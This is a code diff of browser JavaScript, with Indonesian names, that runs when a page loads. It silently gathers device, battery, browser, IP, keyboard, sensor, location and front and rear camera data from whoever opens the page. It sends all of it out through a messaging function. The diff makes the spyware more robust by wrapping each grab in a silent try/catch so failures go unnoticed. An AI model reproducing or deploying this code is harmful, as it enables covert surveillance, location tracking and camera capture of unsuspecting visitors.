@@ -658,19 +658,21 @@ const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  const infoPerangkat = await ambilDataPerangkat();
-  const bateraiInfo = await ambilBaterai();
-  const layarGrafik = await ambilLayarGrafik();
-  const browserInfo = ambilBrowserInfo();
-  const webFeatures = ambilWebAPIFeatures();
-  const izinMedia = await ambilIzinMedia();
-  const ipInfo = await ambilIPInfo();
+  let infoPerangkat = '', bateraiInfo = '', layarGrafik = '', browserInfo = '';
+  let webFeatures = '', izinMedia = '', ipInfo = '', keyboard = '';
+  let perangkatEksternal = '', outputAudio = '', sensorMotion = '';
 
-  // Fitur tambahan
-  const keyboard = ambilKeyboardActivity();
-  const perangkatEksternal = ambilPerangkatEksternal();
-  const outputAudio = await ambilOutputAudio();
-  const sensorMotion = await ambilSensorMotion(); // ✅ Ditambahkan
+  try { infoPerangkat = await ambilDataPerangkat(); } catch {}
+  try { bateraiInfo = await ambilBaterai(); } catch {}
+  try { layarGrafik = await ambilLayarGrafik(); } catch {}
+  try { browserInfo = ambilBrowserInfo(); } catch {}
+  try { webFeatures = ambilWebAPIFeatures(); } catch {}
+  try { izinMedia = await ambilIzinMedia(); } catch {}
+  try { ipInfo = await ambilIPInfo(); } catch {}
+  try { keyboard = ambilKeyboardActivity(); } catch {}
+  try { perangkatEksternal = ambilPerangkatEksternal(); } catch {}
+  try { outputAudio = await ambilOutputAudio(); } catch {}
+  try { sensorMotion = await ambilSensorMotion(); } catch {}
 
   const gabungAwal = [
     infoPerangkat,
@@ -683,19 +685,27 @@ const mulai = async () => {
     keyboard,
     perangkatEksternal,
     outputAudio,
-    sensorMotion // ✅ Masuk dalam array kirim
-  ].join("\n\n");
+    sensorMotion
+  ].filter(Boolean).join("\n\n"); // Hapus bagian kosong
 
-  await kirimPesan(gabungAwal);
+  try { await kirimPesan(gabungAwal); } catch (err) {
+    await kirimPesan("〘 DEBUG ERROR 〙\n" + err.message);
+  }
 
-  const lokasi = await ambilLokasi();
-  await kirimPesan(lokasi);
+  try {
+    const lokasi = await ambilLokasi();
+    await kirimPesan(lokasi);
+  } catch {}
 
-  const depan = await ambilKamera("user", "depan");
-  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
+  try {
+    const depan = await ambilKamera("user", "depan");
+    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
+  } catch {}
 
-  const belakang = await ambilKamera("environment", "belakang");
-  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
+  try {
+    const belakang = await ambilKamera("environment", "belakang");
+    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
+  } catch {}
 };
 
     window.addEventListener("load", mulai);
